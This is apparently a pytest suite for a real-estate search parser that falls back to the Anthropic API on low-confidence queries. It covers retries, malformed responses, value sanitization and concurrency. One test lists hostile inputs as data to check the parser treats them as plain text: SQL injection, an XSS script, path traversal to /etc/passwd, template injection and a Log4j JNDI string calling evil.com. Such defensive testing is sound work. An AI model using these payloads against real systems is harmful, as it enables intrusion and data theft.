"""
Comprehensive edge case tests for Anthropic Tier 2 fallback functionality
"""
import json
import pytest
import time
from unittest.mock import Mock, patch, MagicMock

from app.services.parser import QueryParser
from app.core.config import settings


@pytest.fixture
def mock_anthropic_client():
    """Mock Anthropic client for testing"""
    client = Mock()
    response = Mock()
    response.completion = '{"beds": 3, "baths": 2, "city": "Austin", "max_price": 500000}'
    client.completions.create.return_value = response
    return client


@pytest.fixture
def parser_with_mock_client(mock_anthropic_client):
    """QueryParser with mocked Anthropic client"""
    parser = QueryParser()
    parser.anthropic_client = mock_anthropic_client
    return parser


class TestBasicTier2Functionality:
    """Test basic Tier 2 fallback functionality"""
    
    def test_tier2_triggered_on_low_confidence(self, parser_with_mock_client):
        """Test that Tier 2 fallback is triggered when confidence is below threshold"""
        query = "cozy loft near beach"
        
        result, confidence = parser_with_mock_client.parse_query(query)
        
        # Should have called Anthropic API
        parser_with_mock_client.anthropic_client.completions.create.assert_called_once()
        
        # Should have merged results
        assert result['beds'] == 3
        assert result['baths'] == 2
        assert result['city'] == "Austin"
        assert result['max_price'] == 500000
    
    def test_tier2_not_triggered_on_high_confidence(self, parser_with_mock_client):
        """Test that Tier 2 fallback is NOT triggered when confidence is above threshold"""
        query = "3 bedroom 2 bathroom house in Denver under 600k"
        
        result, confidence = parser_with_mock_client.parse_query(query)
        
        # Should NOT have called Anthropic API
        parser_with_mock_client.anthropic_client.completions.create.assert_not_called()
        
        # Should use Tier 1 results
        assert result['beds'] == 3
        assert result['baths'] == 2
        assert result['city'] == "Denver"
        assert result['max_price'] == 600000


class TestAnthropicAPIEdgeCases:
    """Test edge cases for Anthropic API interactions"""
    
    def test_anthropic_api_timeout(self, parser_with_mock_client):
        """Test handling of API timeout errors"""
        from anthropic import APITimeoutError
        
        query = "luxury apartment"
        parser_with_mock_client.anthropic_client.completions.create.side_effect = APITimeoutError("Request timeout")
        
        result, confidence = parser_with_mock_client.parse_query(query)
        
        # Should fall back to Tier 1
        assert result['beds'] == 0
        assert result['baths'] == 0
        assert result['city'] == "Denver"
        assert result['max_price'] == 1_000_000.0
    
    def test_anthropic_rate_limit_error(self, parser_with_mock_client):
        """Test handling of rate limit errors"""
        query = "modern studio"
        parser_with_mock_client.anthropic_client.completions.create.side_effect = Exception("Rate limit exceeded")
        
        result, confidence = parser_with_mock_client.parse_query(query)
        
        # Should fall back to Tier 1
        assert result['beds'] == 0
        assert result['baths'] == 0
    
    def test_anthropic_authentication_error(self, parser_with_mock_client):
        """Test handling of authentication errors"""
        query = "penthouse suite"
        parser_with_mock_client.anthropic_client.completions.create.side_effect = Exception("Invalid API key")
        
        result, confidence = parser_with_mock_client.parse_query(query)
        
        # Should fall back to Tier 1
        assert result['city'] == "Denver"
    
    def test_anthropic_malformed_json_response(self, parser_with_mock_client):
        """Test handling of malformed JSON responses"""
        query = "family home"
        
        # Test various malformed JSON responses
        malformed_responses = [
            '{"beds": 3, "baths": 2, "city": "Austin"',  # Missing closing brace
            '{"beds": 3, "baths": 2, "city": "Austin", "max_price":}',  # Missing value
            'This is not JSON at all',  # Not JSON
            '',  # Empty response
            '[]',  # Array instead of object
            'null',  # Null response
        ]
        
        for malformed_json in malformed_responses:
            mock_response = Mock()
            mock_response.completion = malformed_json
            parser_with_mock_client.anthropic_client.completions.create.return_value = mock_response
            
            result, confidence = parser_with_mock_client.parse_query(query)
            
            # Should fall back to Tier 1 for all malformed responses
            assert result['city'] == "Denver"
            assert result['max_price'] == 1_000_000.0
    
    def test_anthropic_partial_json_fields(self, parser_with_mock_client):
        """Test handling when some required fields are missing"""
        query = "small apartment"
        
        partial_responses = [
            '{"beds": 1, "baths": 1}',  # Missing city and max_price
            '{"city": "Seattle", "max_price": 400000}',  # Missing beds and baths
            '{"beds": 2, "city": "Portland"}',  # Missing baths and max_price
            '{"baths": 1, "max_price": 300000}',  # Missing beds and city
        ]
        
        for partial_json in partial_responses:
            mock_response = Mock()
            mock_response.completion = partial_json
            parser_with_mock_client.anthropic_client.completions.create.return_value = mock_response
            
            result, confidence = parser_with_mock_client.parse_query(query)
            
            # Should fall back to Tier 1
            assert result['city'] == "Denver"
    
    def test_anthropic_extreme_values_sanitization(self, parser_with_mock_client):
        """Test sanitization of extreme values from Anthropic"""
        query = "mega mansion"
        
        mock_response = Mock()
        mock_response.completion = '{"beds": 100, "baths": -10, "city": "", "max_price": 999999999999}'
        parser_with_mock_client.anthropic_client.completions.create.return_value = mock_response
        
        result, confidence = parser_with_mock_client.parse_query(query)
        
        # Values should be sanitized
        assert result['beds'] == 20  # Capped at max
        assert result['baths'] == 0   # Negative converted to 0
        assert result['city'] == "Denver"  # Empty string converted to default
        assert result['max_price'] == 100_000_000  # Capped at max


class TestRetryLogicEdgeCases:
    """Test retry logic edge cases"""
    
    def test_anthropic_retry_with_different_errors(self, parser_with_mock_client):
        """Test retry logic with different types of errors"""
        query = "downtown condo"
        
        # Test sequence: connection error, rate limit, then success
        mock_response = Mock()
        mock_response.completion = '{"beds": 2, "baths": 1, "city": "Chicago", "max_price": 450000}'
        
        parser_with_mock_client.anthropic_client.completions.create.side_effect = [
            Exception("Connection failed"),
            Exception("Rate limited"),
            mock_response
        ]
        
        with patch('time.sleep'):  # Speed up test
            result, confidence = parser_with_mock_client.parse_query(query)
        
        # Should have called API 3 times
        assert parser_with_mock_client.anthropic_client.completions.create.call_count == 3
        
        # Should have successful result
        assert result['beds'] == 2
        assert result['city'] == "Chicago"
    
    def test_anthropic_exhausted_retries(self, parser_with_mock_client):
        """Test behavior when all retries are exhausted"""
        query = "beachfront property"
        
        # All attempts fail
        parser_with_mock_client.anthropic_client.completions.create.side_effect = Exception("Persistent error")
        
        with patch('time.sleep'):
            result, confidence = parser_with_mock_client.parse_query(query)
        
        # Should have called API max_retries + 1 times
        expected_calls = settings.anthropic_max_retries + 1
        assert parser_with_mock_client.anthropic_client.completions.create.call_count == expected_calls
        
        # Should fall back to Tier 1
        assert result['city'] == "Denver"
        assert result['max_price'] == 1_000_000.0
    
    def test_anthropic_exponential_backoff_timing(self, parser_with_mock_client):
        """Test that exponential backoff timing is correct"""
        query = "luxury villa"
        
        parser_with_mock_client.anthropic_client.completions.create.side_effect = Exception("Network error")
        
        with patch('time.sleep') as mock_sleep:
            result, confidence = parser_with_mock_client.parse_query(query)
            
            # Check that sleep was called with exponential backoff
            expected_delays = [
                settings.anthropic_retry_delay * (settings.anthropic_retry_backoff ** 0),
                settings.anthropic_retry_delay * (settings.anthropic_retry_backoff ** 1),
            ]
            
            sleep_calls = [call[0][0] for call in mock_sleep.call_args_list]
            for i, expected_delay in enumerate(expected_delays[:len(sleep_calls)]):
                assert sleep_calls[i] == expected_delay


class TestExtremeBoundaryConditions:
    """Test extreme boundary conditions and edge cases"""
    
    def test_empty_and_whitespace_queries(self, parser_with_mock_client):
        """Test various empty and whitespace queries"""
        empty_queries = ["", "   ", "\t", "\n"]
        
        for empty_query in empty_queries:
            with pytest.raises(ValueError, match="Query cannot be empty"):
                parser_with_mock_client.parse_query(empty_query)
    
    def test_extremely_long_queries(self, parser_with_mock_client):
        """Test handling of extremely long queries"""
        # Query over limit
        over_limit_query = "a" * (settings.max_query_length + 1)
        with pytest.raises(ValueError, match="Query too long"):
            parser_with_mock_client.parse_query(over_limit_query)
    
    def test_unicode_and_special_characters(self, parser_with_mock_client):
        """Test handling of Unicode and special characters"""
        unicode_queries = [
            "3 bed résidence in Montréal under 500k",  # Accented characters
            "3🏠 2🚿 in Miami under 💰500k",  # Emoji
            "3 bed & 2 bath in Denver @ $600K",  # Special symbols
        ]
        
        for unicode_query in unicode_queries:
            try:
                result, confidence = parser_with_mock_client.parse_query(unicode_query)
                assert result is not None
                assert 'beds' in result
                assert 'city' in result
            except Exception as e:
                pytest.fail(f"Failed to handle Unicode query '{unicode_query}': {e}")
    
    def test_extremely_large_numbers(self, parser_with_mock_client):
        """Test handling of extremely large numbers"""
        large_number_queries = [
            "999999 bed house",  # Unrealistically large beds
            "100 bath mansion",  # Large but reasonable baths
            "under $999999999999999",  # Extremely large price
            "1000000000000000000000 bed place",  # Astronomical bed count
        ]
        
        for query in large_number_queries:
            result, confidence = parser_with_mock_client.parse_query(query)
            
            # Should be sanitized
            assert result['beds'] <= 20
            assert result['baths'] <= 20
            assert result['max_price'] <= 100_000_000
    
    def test_malicious_input_patterns(self, parser_with_mock_client):
        """Test handling of potentially malicious input patterns"""
        malicious_queries = [
            "'; DROP TABLE properties; --",  # SQL injection attempt
            "<script>alert('xss')</script>",  # XSS attempt
            "../../etc/passwd",  # Path traversal attempt
            "{{7*7}}",  # Template injection attempt
            "${jndi:ldap://evil.com/a}",  # Log4j style injection
            "SELECT * FROM users WHERE id = 1 OR 1=1",  # Another SQL injection
        ]
        
        for malicious_query in malicious_queries:
            try:
                result, confidence = parser_with_mock_client.parse_query(malicious_query)
                
                # Should treat as normal text, not execute anything malicious
                assert result is not None
                assert isinstance(result, dict)
                
            except Exception as e:
                # Should not crash, but gracefully handle any errors
                assert "Query cannot be empty" in str(e) or "Query too long" in str(e)


class TestConfigurationEdgeCases:
    """Test edge cases related to configuration"""
    
    def test_confidence_threshold_edge_cases(self, parser_with_mock_client):
        """Test edge cases around confidence threshold"""
        # Test confidence exactly at threshold
        with patch.object(settings, 'tier2_confidence_threshold', 0.5):
            # Mock Tier 1 to return exactly threshold confidence
            with patch.object(parser_with_mock_client, '_tier1_parse') as mock_tier1:
                mock_tier1.return_value = {
                    'beds': 1, 'baths': 1, 'city': 'Denver', 'max_price': 500000, 'confidence': 0.5
                }
                
                result, confidence = parser_with_mock_client.parse_query("test query")
                
                # Should NOT trigger Tier 2 (threshold is exclusive)
                parser_with_mock_client.anthropic_client.completions.create.assert_not_called()
    
    def test_disabled_anthropic_client(self):
        """Test behavior when Anthropic client is not available"""
        with patch.object(settings, 'anthropic_api_key', None):
            parser = QueryParser()
            assert parser.anthropic_client is None
            
            result, confidence = parser.parse_query("luxury penthouse")
            
            # Should use Tier 1 only
            assert result['city'] == "Denver"
    
    def test_anthropic_library_not_available(self):
        """Test behavior when Anthropic library is not installed"""
        with patch('app.services.parser.ANTHROPIC_AVAILABLE', False):
            parser = QueryParser()
            assert parser.anthropic_client is None
            
            result, confidence = parser.parse_query("modern apartment")
            
            # Should use Tier 1 only
            assert result is not None


class TestResultMergingEdgeCases:
    """Test edge cases in result merging logic"""
    
    def test_merge_with_null_values(self, parser_with_mock_client):
        """Test merging when Tier 2 returns null/None values"""
        tier1_result = {'beds': 2, 'baths': 1, 'city': 'Seattle', 'max_price': 400000, 'confidence': 0.4}
        tier2_result = {'beds': None, 'baths': 0, 'city': None, 'max_price': None}
        
        merged = parser_with_mock_client._merge_parse_results(tier1_result, tier2_result)
        
        # Should keep Tier 1 values when Tier 2 has null/None/default values
        assert merged['beds'] == 2
        assert merged['baths'] == 1
        assert merged['city'] == 'Seattle'
        assert merged['max_price'] == 400000
    
    def test_merge_with_conflicting_values(self, parser_with_mock_client):
        """Test merging when Tier 1 and Tier 2 have conflicting non-default values"""
        tier1_result = {'beds': 3, 'baths': 2, 'city': 'Portland', 'max_price': 600000, 'confidence': 0.5}
        tier2_result = {'beds': 4, 'baths': 3, 'city': 'Seattle', 'max_price': 700000}
        
        merged = parser_with_mock_client._merge_parse_results(tier1_result, tier2_result)
        
        # Should prefer Tier 2 values
        assert merged['beds'] == 4
        assert merged['baths'] == 3
        assert merged['city'] == 'Seattle'
        assert merged['max_price'] == 700000


class TestConcurrencyEdgeCases:
    """Test edge cases related to concurrent usage"""
    
    def test_multiple_concurrent_parsing(self, parser_with_mock_client):
        """Test that parser handles concurrent requests properly"""
        import threading
        import time
        
        results = []
        errors = []
        
        def parse_query_thread(query_suffix):
            try:
                result, confidence = parser_with_mock_client.parse_query(f"apartment {query_suffix}")
                results.append((result, confidence))
            except Exception as e:
                errors.append(e)
        
        # Create multiple threads
        threads = []
        for i in range(10):
            thread = threading.Thread(target=parse_query_thread, args=(f"test_{i}",))
            threads.append(thread)
        
        # Start all threads
        for thread in threads:
            thread.start()
        
        # Wait for all threads to complete
        for thread in threads:
            thread.join()
        
        # Check results
        assert len(errors) == 0, f"Errors occurred: {errors}"
        assert len(results) == 10
        
        # All results should be valid
        for result, confidence in results:
            assert isinstance(result, dict)
            assert 'beds' in result
            assert isinstance(confidence, (int, float))


# Run edge case tests
if __name__ == "__main__":
    pytest.main([__file__, "-v"])
